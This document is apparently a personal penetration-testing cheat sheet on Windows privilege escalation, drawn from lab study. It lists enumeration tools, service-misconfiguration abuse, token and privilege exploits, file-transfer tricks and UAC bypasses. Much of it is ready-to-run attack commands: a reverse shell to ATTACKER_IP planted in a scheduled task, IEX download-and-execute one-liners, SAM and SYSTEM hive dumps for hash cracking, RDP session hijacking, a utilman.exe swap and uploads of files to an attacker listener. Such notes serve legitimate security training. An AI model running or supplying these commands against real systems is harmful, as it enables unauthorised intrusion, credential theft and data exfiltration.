
# Automated PrivEsc

for using powershell to download from attacking machine:
	`wget [url] -outfile winPEASx64.exe`

`jaws-enum.ps1` https://github.com/411Hall/JAWS

MSF Modules if you have meterpreter
- See Kiwi Plugin in Metasploit
- `/post/windows/gather/win_privs`
- `/post/windows/gather/enum_logged_on_users`
- `/post/windows/gather/checkvm`
- `/post/windows/gather/enum_applications`
- `/post/windows/gather/enum_computers`
- `/post/windows/gather/enum_shares`


PowerSploit - Windows Privilege Escalation
- https://github.com/PowerShellMafia/PowerSploit/tree/master
- PowerUp.ps1: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md
- A privesc enumerator that uses different modules depending on different levels of privilege. Primarily searches for misconfigurations.
- `. .\PowerUp.ps1`
- `Get-Command -Module Privesc` will return a list of commands
- `Get-Help [command]` will give more details for each

# General

## Enumeration

### Tools

Winpeas - [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

PrivescCheck - [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

- You may need to bypass execution policy restrictions
	- `Set-ExecutionPolicy Bypass -Scope process -Force`
	- `. .\PrivescCheck.ps1`
	- `Invoke-PrivesCheck`

WES-NG: exploit script that doesn't involve uploading. Run from attacking machine
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
- `Wes.py --update` first
- Run `systeminfo` command on the target first, it will pull results from that
- `Wes.py systeminfo.txt` (on attacking machine), this will output it to the .txt file

With MSF meterpreter. `post/windows/manage/enable_rdp` if you want an rdp session (don't migrate processes)

### Manual Enumeration

File permissions: `icacls [file]`
- `Icacls [file] /grant [user]:F`
-  or `Everyone:F` for everyone
- `F` is full
- `AD` is create subdirectories
- `WD` is create files

User Info
- `net user`
- User Passwords:
	- Stored in `/system32/config/SAM`
	- Change user password: `net user [user] [new_pass]`

Powershell history
- `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- View History (cmd prompt version) - `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Saved Credentials
- `Cmdkey /list`
	- Use these with: `runas /savecred /user:[admin] [executable]`
	- You will need the password if there is one

Internet Information Service (web server)
- Stored in web.config, possible locations:
	- `C:\inetpub\wwwroot\web.config`
	- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
	- Find database connections for ISS: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

PuTTY
- Retrieve stored proxy credentials
	- `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

Scheduled Tasks
- `Schtasks`
- list tasks with `schtasks /query /fo LIST`
- To see more details about one of them: `schtasks /query /tn [task name] /fo list /v`
- The taskname is the executable
- The "task to run" parameter indicates the path to the file that runs the executable as a task (.bat file)
- If we have write permissions for the .bat file:
	- If you can modify: `echo c:[executable_path] -e cmd.exe ATTACKER_IP 4444 > ["task to run" file path]` (creates a reverse shell)
- `tasklist /SVC`

Local Network Info
- `arp -a` arp cache
- `route print`
- `ipconfig /all`
- `netstat -ano`

## Unpatched Software

- `Wmic` lists software installed on target (powershell)
	- `Wmic product get name,version,vendor` will dump installed software


## When you have credentials:

`evil-winrm -i [IP] -u [user] -p [password]`

If credentials for SMB, use PSExec if windows to run commands (you can use msf `exploit/windows/psexec`)

If you get credentials of an elevated user, `runas.exe /user:[elevated_user] cmd`

crack windows hashes `auxiliary/analyze/crack_windows`
- this is easy if you started the MSF database, had a meterpreter shell, and did `hash_dump`
- `creds` will show you gathered things
- after running `crack_windows` use `creds` again to see plaintext

## Shell Upgrade

To switch to a meterpreter shell, you can use the `exploit/windows/misc/hta_server` in metasploit. 
- It will generate a URL payload that you can copy and paste into the powershell session that will connect back to MSF and start the meterpreter session. 
- On the target: `mshta.exe [URL_payload]` (mshta.exe is a regular executable under System32 that can execute code embedded in HTML, hta stands for HTML Application) (you might have to foreground the session in msf, it went background for me automatically)

To switch to RDP with meterpreter
- `run getgui -e -u [user] -p [pass]`
- this will create a new user and enable RDP access for them

## Service Creation

if we have local admin privileges but want SYSTEM privileges, we can create a Windows service that will run as Local System and will execute binaries with SYSTEM privileges. https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create

`sc.exe create sessionhijack binpath = "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`
- we created the service `sessionhijack`
- the binary it executes is `cmd.exe` with the added arguments
- in this case, we ran `tscon` which is used to hijack an RDP session from another user (see MS protocols under exploitation)
- `net start sessionhijack` to run


## Service Misconfigurations

#### Insecure Service Executable Permissions
- `Sc qc [service]` shows you the configuration of a particular service
- Binary path is here
- `Service_start_name` shows you the account used to run the service
- Follow enumeration techniques to see if you can overwrite the file (in the example, Everyone had (M) which is modify).
- Replace with a reverse shell or something from msfvenom `windows/x64/shell_reverse_tcp`
- Use a python server and wget (powershell) to move the payload
- Make sure you give it permissions to be executed by everyone, move it to the path of the original executable
- `Sc stop [service]`, and then `sc start [service]` if you don't want to wait

#### Unquoted Service Paths
- Service paths that don't have quotes can be tricked if they have spaces and shit
- `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
	- Has spaces on disk sorter enterprise
	- It will search for `C:\\MyPrograms\\Disk.exe` first
	- Then `C:\\MyPrograms\\Disk Sorter.exe`
	- And finally `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe` (this option is expected to succeed)
- Obviously this doesn't work if the service is in C:\Program Files this won't work because of administrator privileges. If you find an unquoted path somewhere else though, check permissions.

#### Insecure Service Permissions
- If the service Discretionary Access Control List (DACL) (not the service executable, but the service) allows you to modify the configuration of a service, you can have it point to a different executable.
- You can use `accesschk64.exe` (must be in the directory that the .exe is in) to check service permissions. You might have to install this tool.
	- `Accesschk64.exe -qlc [service]`
	- You’re looking for permissions under BUILTIN\Users and something like SERVICE_ALL_ACCESS
- NOTE: instead of like before where we replace the executable, we are going to change the path of the executable because we can configure the service (this is a different vulnerability than the other service misconfigs).
	- Put the payload file wherever
	- Use `sc config [service] binPath= "[file path for payload]" obj= LocalSystem`
		- Local system is the account to run the service. LocalSystem was the highest privileged account available

## Processes

Consider migrating to a process that has the same architecture as the system (x64, etc)

migrate to a PID with higher privileges (running `ps` on meterpreter should show them)

meterpreter
- `ps`, `getpid`, `pgrep [process]`, `migrate [PID]`


## Dangerous Privileges


`Whoami /priv` to check privileges
`getprivs` in meterpreter
`net users` in CMD, `net localgroup`
- [https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) list of privileges
- Privileges that are specifically exploitable: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- It said disabled in the THM room but we still had them?

#### SeBackup / SeRestore
- Allow users to read and write to any file on the system, ignoring DACL.
- You can probably run cmd prompt as admin with this
- You can backup the SAM and SYSTEM hashes:
	- `Reg save hklm\system C:\[wherever]\system.hive`
	- `Reg save hklm\sam C:\[wherever]\sam.hive`
- You will need to get these on your machine.
	- You can use the `download` command if you're using `evil-winrm`
- To read the hashes: `pypykatz registry --sam sam system`


#### SeTakeOwnership
- Allows user to take ownership of any object on the system
- You could take ownership of a service executable running as SYSTEM
- `Takeown /f [path to executable]`
- Being the owner doesn't mean you have privileges, you still need to assign them with `icacls`
- In this example we used `copy` to replace utilman.exe with a cmd.exe, so when it runs it will give us a command prompt with SYSTEM privileges
- Lock the screen, and run the 'ease of access' on the lock screen to activate utilman

#### SeImpersonate / SeAssignPrimaryToken /SeCreateToken
- Allows services to be executed on behalf of another user. 
- Incognito module in MSF
	- `load incognito`
	- `list_tokens -u`
	- Delegation tokens are from interactive logons
	- Impersonation tokens are from non-interactive logons
	- `impersonate_token "[token]"`
- You can use `PrintSpoofer.exe -i -c powershell` and open an escalated powershell prompt


# File Transfer

## Without network communication:

Do a base64 encode (example file is `id_rsa`)
- `md5sum idrsa` to check hash (your machine)
- `cat id_rsa | base64 -w 0;echo` will echo a base64 encoded version
- paste the encoded version in powershell
	- `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("encoded payload"))`
- Check MD5 sum
	- `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

File Download
- `(New-Object Net.WebClient).DownloadFile('Target URL', 'Output File')`
- To download as a string instead of file:
	- `IEX (New-Object Net.WebClient).DownloadString('string')`
	- or `(New-Object Net.WebClient).DownloadString('string') | IEX`

## With Network Communications:

`wget` in POWERSHELL
`wget [link] -outfile [file name]`

Meterpreter
- go to `C:\\Users\\[user]\\AppData\\Local\\Temp`
- `upload [file]`
#### SMB

- Make a server on your machine with impacket (unauthenticated)
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare`
	- Powershell: `copy \\192.168.220.133\share\nc.exe`
- Authenticated version if you are required to use authenticated access
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
	- Powershell: `net use n: \\192.168.220.133\share /user:test test`

#### FTP 

Download from our FTP server
- `sudo python3 -m pyftpdlib --port 21`
- Powershell `(New-Object Net.WebClient).DownloadFile('ftp://[IP]/[file]', '[output file]')`

Upload to our FTP server
- `sudo python3 -m pyftpdlib --port 21 --write`
- Powershell: `(New-Object Net.WebClient).UploadFile('ftp://[IP]/[output file]', '[file to upload]')`

#### Other file upload methods 

Python Upload Server - upload something like the host file
- `python3 -m uploadserver`
- On powershell, download the PSUpload.ps1 script to perform upload operations
	- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
- Upload File: `Invoke-FileUpload -Uri http://[attacker-IP]:8000/upload -File [file to upload]`

PowerShell Base64 Upload (host file as example)
- Encode a file: `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
- Send to target: `Invoke-WebRequest -Uri http://[attacker-IP]:[listener-port]/ -Method POST -Body $b64`
- Make sure you have a `nc` listener set up
- Read the file: `echo <base64> | base64 -d -w 0 > hosts`

### RDP

You can copy/paste, but sometimes this is disabled

Mount a directory from host machine: `rdesktop [target] -d [hostname/domain] -u [target_user] -p '[password]' -r disk:linux='[file path you want to mount]'`
- This command will log you in via RDP and also mount the directory
- visit the network location `tsclient` on the windows machine to see the mounted folder
- I'm not sure the hostname matters.


# Bypass UAC

Administrator localgroup required
UAC is the "Do you want to allow this app to make changes to your device?" prompt

Why do we need to do this?
- You should already have access with an account that belongs to the "local administrators" group, but because we are in a shell we can't bypass the consent dialogue box
- UAC must be on default settings (not highest but default security setting)
- We need the highest privilege account in order to execute something that won't need the consent prompt

MSF `/exploit/windows/local/bypassuac_injection`
- set payload to something like `/windows/x64/meterpreter/reverse_tcp` or something that matches system architecture
- I had to `set target 1` which doesn't show as an option but was in the lab... the meterpreter session was 1, maybe that's why?

https://github.com/hfiref0x/UACME UACMe tool
- check out usage and look at all the methods
- `akagi64 [key] [param]` where key is the method number, param is the thing you want to execute
- find method designed for whatever OS your target is running on
- upload a reverse shell which will be used in conjunction with the Akagi executable which will give you an elevated session (same user, more privileges)




